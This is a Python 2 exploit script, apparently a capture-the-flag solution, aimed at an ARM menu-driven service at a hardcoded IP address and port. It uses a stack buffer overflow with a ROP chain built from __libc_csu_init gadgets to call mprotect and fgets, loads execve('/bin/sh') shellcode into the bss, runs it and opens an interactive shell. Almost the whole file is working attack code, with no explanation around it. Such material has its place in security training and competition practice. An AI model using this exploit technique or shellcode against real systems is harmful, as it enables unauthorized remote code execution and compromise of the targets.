#!/usr/bin/env python2
#-*- coding:utf-8 -*-
from zio import *

ip = '202.112.51.198'
#ip = '192.168.7.2'
port = 1234

io = zio((ip,port), timeout=1000, print_write=COLORED(REPR))
io.read_until('Selection: ')
io.writeline('3')
io.read_until('(1 - 100)?: ')
io.writeline('1')
io.read_until('book? ')
io.writeline('1')
io.read_until('Selection: ')

ret1 = 0x8978+1 # MainMenu = 0x8978 bit:1
payload_1 = 'a'*84 + l32(0x150) + 'a'*12 + 'AAAA' + l32(ret1)

io.writeline('5')
io.writeline(payload_1)
io.read_until('Selection: ')
io.writeline('5')

'''
__libc_csu_init
.text:000092E0                 MOV             R0, R5
.text:000092E2                 MOV             R1, R6
.text:000092E4                 MOV             R2, R7
.text:000092E6                 ADDS            R4, #1
.text:000092E8                 BLX             R3
.text:000092EA                 CMP             R4, R9
.text:000092EC                 BNE             loc_92DC
.text:000092EE                 POP.W           {R3-R9,PC}
'''
gadget_1 = 0x92EE+1 #bit:1
gadget_2 = 0x92E0+1 #bit:1

'''
Linux/ARM - execve("/bin/sh", [0], [0 vars]) - 27 bytes
'''
shellcode = "\x01\x30\x8f\xe2" + "\x13\xff\x2f\xe1" +\
            "\x78\x46\x08\x30" + "\x49\x1a\x92\x1a" +\
            "\x0b\x27\x01\xdf" + "\x2f\x62\x69\x6e" +\
            "\x2f\x73\x68";

def get_payload(ret,r4,r5,r6,r7,r8,r9):
    payload = ""                 # POP.W  {R3-R9,PC}
    payload += l32(ret)      #     R3
    payload += l32(r4)       #     R4
    payload += l32(r5)       # RO<-R5
    payload += l32(r6)       # R1<-R6
    payload += l32(r7)       # R2<-R7
    payload += l32(r8)       #     R8
    payload += l32(r9)       #     R9
    payload += l32(gadget_2) #    PC
    return payload

bss_addr = 0x6b000  # bit:0
mprotect = 0x12570  # bit:0
page_size = 0x1000
fgets = 0xa1b0+1      # bit:1
stdin = 0x6c370
'''
mprotect -> fgets -> call
'''
# mprotect shellcode
rop = get_payload(mprotect, 0x61616161, bss_addr, page_size, 0x7,\
                    0x61616161, 0x61616162)
# fgets shellcode
rop += get_payload(fgets, 0x61616161, bss_addr, len(shellcode)+1,\
                    stdin, 0x61616161, 0x61616162)
# call shellcode
rop += get_payload(bss_addr, 0x61616161, 0x61616161, 0x61616161,\
                        0x61616161, 0x61616161, 0x61616162)
#log(len(rop), 'red')
payload_2 = "A"*104 + l32(gadget_1) + rop

io.writeline(payload_2)
io.writeline(shellcode)
io.interact()
